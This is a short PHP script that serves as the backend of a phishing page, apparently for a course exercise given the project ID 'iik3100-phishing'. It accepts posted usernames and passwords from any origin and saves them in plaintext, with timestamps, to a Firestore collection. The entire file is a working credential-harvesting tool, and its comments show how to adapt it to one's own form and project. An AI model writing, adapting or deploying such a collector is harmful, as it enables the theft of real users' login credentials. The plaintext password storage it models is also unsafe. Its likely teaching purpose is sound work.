<?php
require 'vendor/autoload.php'; // Load the Firebase SDK

use Google\Cloud\Firestore\FirestoreClient;

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: GET, POST");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Handle form submission
    $username = $_POST['username']; // Replace 'username' with the actual input name from your form
    $password = $_POST['password']; // Replace 'password' with the actual input name from your form

    // Firebase project ID
    $projectId = 'iik3100-phishing'; // Replace with your actual project ID

    $db = new FirestoreClient([
        'projectId' => $projectId,
    ]);

    // Reference to a Firestore collection (change 'users' to your desired collection name)
    $collection = $db->collection('users');

    // Get the current timestamp
    $currentTime = date('Y-m-d H:i:s');

    // Create a new document with username, password, and timestamp
    $newUser = $collection->add([
        'username' => $username,
        'password' => $password,
        'timestamp' => $currentTime,
    ]);

    echo 'New user added with ID: ' . $newUser->id();
} else {
    // Handle GET request or display the form
    // You can place your HTML form here
    echo 'Please use a POST request to submit the form.';
}
?>
